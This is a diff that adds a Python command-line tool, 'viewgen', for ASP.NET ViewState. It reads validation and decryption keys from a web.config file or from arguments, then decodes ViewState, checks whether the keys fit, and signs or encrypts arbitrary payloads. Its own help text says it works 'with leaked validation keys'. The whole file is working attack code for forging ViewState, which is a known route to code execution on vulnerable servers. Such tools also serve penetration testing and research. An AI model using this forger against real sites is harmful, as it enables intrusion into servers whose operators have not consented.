@@ -1,0 +1,253 @@
+#!/usr/bin/env python3
+
+
+from pprint import pprint
+from Crypto.Cipher import AES
+from Crypto.Cipher import DES
+from Crypto.Cipher import DES3
+from viewstate import ViewState
+from xml.dom import minidom
+from colored import fg, attr
+
+import argparse, hashlib, hmac, base64, os, binascii, struct
+
+
+pad = lambda s, bs : s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode("ascii")
+unpad = lambda s : s[:-ord(s[len(s)-1:])]
+
+
+def success(s):
+	print("[%s+%s] %s%s%s%s" % (fg("light_green"), attr(0), attr(1), s, attr(21), attr(0)))
+
+
+def warning(s):
+	print("[%s!%s] %s%s%s%s" % (fg("yellow"), attr(0), attr(1), s, attr(21), attr(0)))
+
+
+class ViewGen:
+	MD5_MODIFIER = b"\x00"*4
+	hash_algs = {"sha1": hashlib.sha1, "md5": hashlib.md5, "sha256": hashlib.sha256, "sha384": hashlib.sha384, "sha512": hashlib.sha512}
+	hash_sizes = {"sha1": 20, "md5": 16, "sha256": 32, "sha384": 48, "sha512": 64}
+
+	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False):
+		self.validation_key = validation_key
+		self.dec_key = dec_key
+		self.validation_alg = validation_alg.lower()
+		self._init_dec_alg(dec_alg)
+		self.encrypted = encrypted
+		if modifier is None:
+			self.modifier = ViewGen.MD5_MODIFIER
+		else:
+			self.modifier = struct.pack("<I", int(modifier, 16))
+		self._reuse_iv = False
+		self._iv = None
+		self._random_bytes = None
+
+	def encode(self, payload, reuse_iv=False):
+		self._reuse_iv = reuse_iv
+		if self.encrypted:
+			return self.encrypt_and_sign(payload)
+		return self.sign(payload)
+
+	def decode(self, payload, parse=False):
+		if self.encrypted:
+			payload, signature = self.decrypt(payload)
+			vs = ViewState(payload)
+		else:
+			vs = ViewState(payload)
+			vs.decode()
+			signature = vs.signature
+			if self.validation_alg is None:
+				self.validation_alg = vs.mac
+			payload = base64.b64encode(base64.b64decode(payload)[:-self._get_hash_size()])
+		if parse:
+			return vs.decode(), signature
+		return payload, signature
+
+	def encrypt(self, data):
+		iv = self._iv
+		random_bytes = self._random_bytes
+
+		if self.dec_alg == "AES":
+			if not self._reuse_iv:
+				iv = self._gen_random_bytes(AES.block_size)
+				random_bytes = self._gen_random_bytes(AES.block_size)
+			cipher = AES.new(self.dec_key, AES.MODE_CBC, iv)
+			payload = pad(random_bytes + data + self.modifier, AES.block_size)
+		elif self.dec_alg == "DES":
+			if not self._reuse_iv:
+				iv = self._gen_random_bytes(DES.block_size)
+			cipher = DES.new(self.dec_key[:8], DES.MODE_CBC, iv)
+			payload = pad(data + self.modifier, DES.block_size)
+		elif self.dec_alg == "3DES":  # TODO
+			if not self._reuse_iv:
+				iv = self._gen_random_bytes(DES3.block_size)
+			cipher = DES3.new(self.dec_key[:24], DES3.MODE_CBC, iv)
+			payload = pad(data + self.modifier, DES3.block_size)
+		else:
+			return None
+
+		return cipher.encrypt(payload), iv
+
+	def decrypt(self, payload):
+		data = base64.b64decode(payload)
+		hash_size = self._get_hash_size()
+		if self.dec_alg == "AES":
+			iv = data[0:AES.block_size]
+			enc = data[AES.block_size:-hash_size]
+			cipher = AES.new(self.dec_key, AES.MODE_CBC, iv)
+			block_size = AES.block_size
+			random_bytes_size = block_size
+		elif self.dec_alg == "DES":
+			iv = data[0:DES.block_size]
+			enc = data[DES.block_size:-hash_size]
+			cipher = DES.new(self.dec_key[:8], DES.MODE_CBC, iv)
+			random_bytes_size = 0
+		elif self.dec_alg == "3DES":  # TODO
+			iv = data[0:DES3.block_size]
+			enc = data[DES3.block_size:-hash_size]
+			cipher = DES3.new(self.dec_key[:24], DES3.MODE_CBC, iv)
+			random_bytes_size = 0
+		else:
+			return None
+
+		dec = cipher.decrypt(enc)
+		signature = data[-hash_size:]
+		unpad_dec = unpad(dec)
+		self._random_bytes = unpad_dec[:random_bytes_size]
+		self._iv = iv
+		modifier = unpad_dec[-4:]
+		return base64.b64encode(unpad_dec[random_bytes_size:-4]), signature
+
+	def encrypt_and_sign(self, payload):
+		data = base64.b64decode(payload)
+		enc, iv = self.encrypt(data)
+
+		if "md5" in self.validation_alg:
+			h = hashlib.md5(iv + enc + self.validation_key)
+		elif "aes" in self.validation_alg:
+			return None  # TODO
+		elif "3des" in self.validation_alg:
+			return None  # TODO
+		else:
+			hash_alg = self._get_hash_alg()
+			if hash_alg:
+				h = hmac.new(self.validation_key, iv + enc, hash_alg)
+			else:
+				return None
+
+		return base64.b64encode(iv + enc + h.digest())
+
+	def sign(self, payload):
+		data = base64.b64decode(payload)
+
+		if "md5" in self.validation_alg:
+			h = hashlib.md5(data + self.validation_key + ViewGen.MD5_MODIFIER)
+		elif "aes" in self.validation_alg:
+			return None  # TODO
+		elif "3des" in self.validation_alg:
+			return None  # TODO
+		else:
+			hash_alg = self._get_hash_alg()
+			if hash_alg:
+				h = hmac.new(self.validation_key, data + self.modifier, hash_alg)
+			else:
+				return base64.b64encode(data)
+
+		return base64.b64encode(data + h.digest())
+
+	@staticmethod
+	def _gen_random_bytes(n):
+		return os.urandom(n)
+
+	def _init_dec_alg(self, dec_alg):
+		self.dec_alg = dec_alg.upper()
+		if "AUTO" in self.dec_alg:
+			if len(self.dec_key) == 8:
+				self.dec_alg = "DES"
+			else:
+				self.dec_alg = "AES"
+		if self.dec_alg == "3DES":
+			if len(self.dec_key) == 8:
+				self.dec_alg = "DES"
+
+	def _get_hash_size(self):
+		return self._search_dict(ViewGen.hash_sizes, self.validation_alg)
+
+	def _get_hash_alg(self):
+		return self._search_dict(ViewGen.hash_algs, self.validation_alg)
+
+	@staticmethod
+	def _search_dict(d, query):
+		l = [value for key, value in d.items() if query in key.lower()]
+		if not l:
+			return None
+		return l[0]
+
+
+def read_webconfig(webconfig_path):
+	document = minidom.parse(webconfig_path)
+	machine_key = document.getElementsByTagName("machineKey")[0]
+	vkey = machine_key.getAttribute("validationKey")
+	valg = machine_key.getAttribute("validation")
+	dkey = machine_key.getAttribute("decryptionKey")
+	dalg = machine_key.getAttribute("decryption")
+	encrypted = False
+
+	for subelement in document.getElementsByTagName("pages"):
+		if subelement.getAttribute("viewStateEncryptionMode") == "Always":
+			encrypted = True
+
+	return vkey, valg, dkey, dalg, encrypted
+
+
+def parse_args():
+	parser = argparse.ArgumentParser(description="viewgen is a ViewState generator, capable of both signing and encrypting payloads with leaked validation keys")
+	parser.add_argument("-c", "--webconfig", help="loads web.config file", required=False)
+	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default=None)
+	parser.add_argument("-e", "--encrypted", help="Viewstate is encrypted", required=False, default=False, action="store_true")
+	parser.add_argument("-d", "--decode", help="decodes ViewState payload", required=False, default=False, action="store_true")
+	parser.add_argument("--check", help="checks if modifier and keys are correct for a given ViewState payload", required=False, default=False, action="store_true")
+	parser.add_argument("--vkey", help="validation key", required=False)
+	parser.add_argument("--valg", help="validation algorithm", required=False)
+	parser.add_argument("--dkey", help="decryption key", required=False)
+	parser.add_argument("--dalg", help="decryption algorithm", required=False)
+	parser.add_argument("payload", help="viewState payload (base 64 encoded)")
+	args = parser.parse_args()
+
+	if args.webconfig:
+		args.vkey, args.valg, args.dkey, args.dalg, args.encrypted = read_webconfig(args.webconfig)
+
+	if not args.vkey or not args.valg or not args.dkey or not args.dalg:
+		warning("Please provide validation/decryption keys and algorithms or a valid web.config")
+		exit(1)
+
+	return args
+
+
+def run_viewgen(args):
+	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted)
+
+	if args.decode:
+		viewstate, signature = viewgen.decode(args.payload, parse=True)
+		success("ViewState")
+		pprint(viewstate)
+		if signature is not None:
+			success("Signature")
+			print(str(binascii.hexlify(signature), "utf-8"))
+	if args.check:
+		viewstate, sa = viewgen.decode(args.payload)
+		encoded = viewgen.encode(viewstate, reuse_iv=True)
+		viewstate, sb = viewgen.decode(encoded)
+		if sa == sb:
+			success("Signature match")
+		else:
+			warning("Signature fail")
+	if not args.decode and not args.check:
+		result = viewgen.encode(args.payload)
+		print(str(result, "utf-8"))
+
+
+if __name__ == "__main__":
+	args = parse_args()
+	run_viewgen(args)
